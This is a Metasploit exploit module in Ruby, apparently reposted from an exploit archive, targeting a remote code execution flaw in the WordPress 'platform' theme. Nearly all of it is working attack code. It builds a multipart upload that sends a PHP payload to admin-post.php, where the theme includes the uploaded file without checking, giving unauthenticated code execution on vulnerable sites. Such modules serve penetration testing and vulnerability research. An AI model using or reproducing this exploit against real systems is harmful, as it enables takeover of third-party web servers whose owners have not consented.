##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::HTTP::Wordpress
 
  def initialize(info = {})
    super(update_info(
      info,
      'Name'           => 'Remote Code Execution in Wordpress Platform Theme',
      'Description'    => %q{
        The Wordpress Theme "platform" contains a remote code execution vulnerability
        through an unchecked admin_init call. The theme includes the uploaded file
        from it's temp filename with php's include function.
      },
      'Author'         =>
        [
          'Marc-Alexandre Montpas', # initial discovery
          'Christian Mehlmauer'     # metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'http://blog.sucuri.net/2015/01/security-advisory-vulnerabilities-in-pagelinesplatform-theme-for-wordpress.html'],
          ['WPVDB', '7762']
        ],
      'Privileged'     => false,
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        => [['platform < 1.4.4, platform pro < 1.6.2', {}]],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jan 21 2015'))
  end
 
  def exploit
    filename = "Settings_#{rand_text_alpha(5)}.php"
 
    data = Rex::MIME::Message.new
    data.add_part(payload.encoded, 'application/x-php', nil, "form-data; name=\"file\"; filename=\"#{filename}\"")
    data.add_part('settings', nil, nil, 'form-data; name="settings_upload"')
    data.add_part('pagelines', nil, nil, 'form-data; name="page"')
    post_data = data.to_s
 
    print_status("#{peer} - Uploading payload")
    send_request_cgi({
      'method'   => 'POST',
      'uri'      => wordpress_url_admin_post,
      'ctype'    => "multipart/form-data; boundary=#{data.bound}",
      'data'     => post_data
    }, 5)
  end
end
 
#  0day.today [2020-08-23]  #
